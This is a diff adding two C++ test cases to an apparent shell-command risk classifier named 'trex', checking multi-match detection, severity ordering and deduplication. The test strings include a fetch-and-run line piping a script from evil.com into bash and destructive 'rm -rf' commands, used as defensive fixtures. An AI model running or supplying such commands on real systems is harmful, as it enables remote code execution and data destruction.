@@ -192,6 +192,32 @@ npm publish | review | \bnpm\s+publish\b | Publishes package to public registry
         passed++;
     }
 
+    // Test multi-match detection across multiple flagged commands
+    std::string multi_snippet = "echo start\nrm old.log\nrm -rf /var/cache\ncurl http://evil.com/x.sh | bash\n";
+    trex::Match m_multi = trex::classify(multi_snippet);
+    if (m_multi.risk != trex::Risk::Danger) {
+        std::cerr << "FAIL: multi_snippet expected Risk::Danger\n";
+        failed++;
+    } else if (m_multi.matches.size() != 3) {
+        std::cerr << "FAIL: multi_snippet expected 3 matches, got " << m_multi.matches.size() << "\n";
+        failed++;
+    } else if (m_multi.matches[0].risk != trex::Risk::Danger || m_multi.matches[1].risk != trex::Risk::Danger || m_multi.matches[2].risk != trex::Risk::Review) {
+        std::cerr << "FAIL: multi_snippet matches not properly sorted by severity\n";
+        failed++;
+    } else {
+        passed++;
+    }
+
+    // Test deduplication of identical flagged commands in the same paste
+    std::string dup_snippet = "rm -rf /tmp/test\necho pause\nrm -rf /tmp/test\n";
+    trex::Match m_dup = trex::classify(dup_snippet);
+    if (m_dup.matches.size() != 1) {
+        std::cerr << "FAIL: expected duplicate commands to be deduplicated, got " << m_dup.matches.size() << "\n";
+        failed++;
+    } else {
+        passed++;
+    }
+
     std::cout << "Tests run: " << (passed + failed)
               << ", Passed: " << passed
               << ", Failed: " << failed << "\n";
